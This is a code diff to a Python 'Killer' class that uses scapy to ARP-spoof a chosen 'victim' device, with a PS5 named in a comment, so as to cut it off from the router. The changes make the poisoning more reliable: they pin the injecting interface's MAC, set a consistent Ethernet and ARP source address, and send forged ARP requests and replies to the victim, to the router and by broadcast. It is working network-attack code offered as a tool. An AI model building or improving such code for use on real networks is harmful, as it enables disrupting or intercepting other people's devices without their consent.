@@ -519,6 +519,7 @@ class Killer:
                         conf.iface = tok
                     except Exception:
                         pass
+                    self._adopt_open_l2_token(tok)
                     return self._socket
                 except Exception:
                     self._socket = None
@@ -526,6 +527,28 @@ class Killer:
                     continue
             return None
     
+    def _adopt_open_l2_token(self, tok: str) -> None:
+        """Pin iface GUID/MAC to the Npcap bind that actually opened (not a name-matched ghost)."""
+        tok = str(tok or '').strip()
+        if not tok or self.iface is None:
+            return
+        self.iface.guid = tok
+        try:
+            from scapy.all import get_if_hwaddr
+
+            mac = good_mac(get_if_hwaddr(tok))
+            if mac_address_is_usable(mac):
+                self.iface.mac = mac
+        except Exception:
+            pass
+
+    def _poison_hwsrc(self) -> str:
+        """Ethernet/ARP source MAC for poison — the radio we are injecting on."""
+        mac = good_mac(getattr(self.iface, 'mac', None) or '')
+        if mac_address_is_usable(mac):
+            return mac
+        return good_mac(getattr(self.iface, 'mac', GLOBAL_MAC) or GLOBAL_MAC)
+
     def _send_packet(self, packet):
         """Send packet using persistent socket, fallback to new socket if needed"""
         sock = self._get_socket()
@@ -754,6 +777,7 @@ class Killer:
         """
         self._sync_iface_for_victim(victim, refresh_router=not ics_mode)
         self._refresh_victim_mac_from_cache(victim)
+        self._get_socket()
         mac = victim['mac']
         # Reassert path: even if already marked killed, refresh victim record and restart
         # ARP worker generation so ON state recovers from stale/desynced workers.
@@ -958,33 +982,34 @@ class Killer:
         PS5 never sees those frames and Kill does nothing. Add victim-targeted
         L2 broadcast copies (pdst/hwdst still this victim only — not a GARP).
         """
+        src = self._poison_hwsrc()
         # Victim: "router is at PC MAC"
-        to_victim_req = Ether(dst=victim['mac']) / ARP(
+        to_victim_req = Ether(src=src, dst=victim['mac']) / ARP(
             op=1,
             psrc=self.router['ip'],
-            hwsrc=self.iface.mac,
+            hwsrc=src,
             pdst=victim['ip'],
             hwdst=victim['mac'],
         )
-        to_victim_reply = Ether(dst=victim['mac']) / ARP(
+        to_victim_reply = Ether(src=src, dst=victim['mac']) / ARP(
             op=2,
             psrc=self.router['ip'],
-            hwsrc=self.iface.mac,
+            hwsrc=src,
             pdst=victim['ip'],
             hwdst=victim['mac'],
         )
         # Router: "victim is at PC MAC"
-        to_router_req = Ether(dst=self.router['mac']) / ARP(
+        to_router_req = Ether(src=src, dst=self.router['mac']) / ARP(
             op=1,
             psrc=victim['ip'],
-            hwsrc=self.iface.mac,
+            hwsrc=src,
             pdst=self.router['ip'],
             hwdst=self.router['mac'],
         )
-        to_router_reply = Ether(dst=self.router['mac']) / ARP(
+        to_router_reply = Ether(src=src, dst=self.router['mac']) / ARP(
             op=2,
             psrc=victim['ip'],
-            hwsrc=self.iface.mac,
+            hwsrc=src,
             pdst=self.router['ip'],
             hwdst=self.router['mac'],
         )
@@ -1008,19 +1033,19 @@ class Killer:
             bcast = 'ff:ff:ff:ff:ff:ff'
             frames.extend(
                 [
-                    Ether(dst=bcast)
+                    Ether(src=src, dst=bcast)
                     / ARP(
                         op=1,
                         psrc=self.router['ip'],
-                        hwsrc=self.iface.mac,
+                        hwsrc=src,
                         pdst=victim['ip'],
                         hwdst=victim['mac'],
                     ),
-                    Ether(dst=bcast)
+                    Ether(src=src, dst=bcast)
                     / ARP(
                         op=2,
                         psrc=self.router['ip'],
-                        hwsrc=self.iface.mac,
+                        hwsrc=src,
                         pdst=victim['ip'],
                         hwdst=victim['mac'],
                     ),
